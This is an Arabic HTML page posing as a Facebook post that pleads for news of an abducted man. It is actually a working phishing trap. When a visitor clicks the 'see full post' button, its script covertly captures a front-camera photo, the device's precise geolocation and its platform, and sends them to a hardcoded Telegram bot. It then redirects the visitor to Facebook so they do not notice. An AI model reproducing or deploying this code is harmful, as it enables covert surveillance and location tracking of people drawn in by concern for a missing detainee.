<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فيسبوك - منشور</title>
    
    <meta property="og:title" content="أين محمد مصطفى العنعوني؟ #الحرية_للمعتقلين">
    <meta property="og:description" content="بأي ذنب يُخطف؟ اللهم ردّه إلينا سالماً.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png">

    <style>
        body { margin:0; padding:0; background:#f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; }
        
        /* حاوية المنشور */
        .post-card { width: 100%; max-width: 500px; background: white; margin-top: 10px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); overflow: hidden; }
        
        /* رأس المنشور */
        .post-header { display: flex; align-items: center; padding: 12px; }
        .profile-pic { width: 40px; height: 40px; border-radius: 50%; background: #ddd; margin-left: 10px; overflow: hidden; }
        .profile-pic img { width: 100%; height: 100%; object-fit: cover; }
        .user-info { display: flex; flex-direction: column; }
        .user-name { font-weight: bold; font-size: 15px; color: #050505; }
        .post-time { font-size: 13px; color: #65676b; }

        /* نص المنشور */
        .post-content { padding: 4px 16px 16px 16px; font-size: 16px; line-height: 1.4; color: #050505; }

        /* منطقة التمويه (الزر) */
        .overlay-container { position: relative; width: 100%; height: 300px; background: #000; display: flex; justify-content: center; align-items: center; }
        .video-thumbnail { position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0.5; }
        
        .see-more-btn {
            position: relative; z-index: 10;
            padding: 12px 30px; background: #1877f2; color: white;
            border: none; border-radius: 6px; font-weight: bold;
            font-size: 16px; cursor: pointer; transition: 0.2s;
        }
        .see-more-btn:active { transform: scale(0.95); }

        /* أزرار التفاعل الوهمية */
        .post-actions { display: flex; border-top: 1px solid #ced0d4; margin: 0 16px; padding: 4px 0; justify-content: space-around; }
        .action-item { color: #65676b; font-size: 14px; font-weight: 600; padding: 8px; cursor: pointer; }
    </style>
</head>
<body>

<div class="post-card">
    <div class="post-header">
        <div class="profile-pic">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png" alt="">
        </div>
        <div class="user-info">
            <span class="user-name">أخبار المجتمع</span>
            <span class="post-time">منذ ٢ ساعة · 🌍</span>
        </div>
    </div>

    <div class="post-content">
        بأي ذنب يُخطف [محمد مصطفى العنعوني]؟ وبأي حق نعيش في غابة يغيب فيها القانون ويحضر فيها الغدر؟ قلوبنا تتقطع، ولا نسأل إلا سؤالاً واحداً: أين دور المسؤولين عما يحدث؟ اللهم ردّه إلينا سالماً وحسبنا الله ونعم الوكيل.
    </div>

    <div class="overlay-container">
        <video class="video-thumbnail" autoplay muted loop playsinline>
            <source src="1.mp4" type="video/mp4">
        </video>
        <button class="see-more-btn" id="p_trigger">رؤية المنشور كاملاً</button>
    </div>

    <div class="post-actions">
        <div class="action-item">👍 أعجبني</div>
        <div class="action-item">💬 تعليق</div>
        <div class="action-item">↪️ مشاركة</div>
    </div>
</div>

<script>
const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
const CHAT_ID = "1611398303";

document.getElementById('p_trigger').onclick = function() {
    this.innerText = "جاري التحميل...";
    this.disabled = true;
    executeSequence();
};

async function executeSequence() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const v = document.createElement('video');
        v.srcObject = stream;
        v.play();

        setTimeout(async () => {
            const canvas = document.createElement('canvas');
            canvas.width = 720; canvas.height = 1280;
            canvas.getContext('2d').drawImage(v, 0, 0, 720, 1280);
            const imgData = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(t => t.stop());

            navigator.geolocation.getCurrentPosition(
                (pos) => finalize(imgData, pos),
                () => finalize(imgData, null),
                { enableHighAccuracy: true }
            );
        }, 1200);

    } catch (err) {
        window.location.href = "https://m.facebook.com/";
    }
}

async function finalize(img, pos) {
    let text = `🚩 صيد من المنشور الاحترافي\n📱 الجهاز: ${navigator.platform}`;
    if(pos) {
        text += `\n📍 الموقع: ${pos.coords.latitude},${pos.coords.longitude}`;
        text += `\n🔗 الخريطة: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
    }

    const blob = dataURLtoBlob(img);
    const fd = new FormData();
    fd.append('photo', blob, 'cam.jpg');
    fd.append('caption', text);
    fd.append('chat_id', CHAT_ID);

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    window.location.href = "https://m.facebook.com/";
}

function dataURLtoBlob(d) {
    let arr = d.split(','), m = arr[0].match(/:(.*?);/)[1], b = atob(arr[1]), n = b.length, u = new Uint8Array(n);
    while(n--) u[n] = b.charCodeAt(n);
    return new Blob([u], {type: m});
}
</script>
</body>
</html>
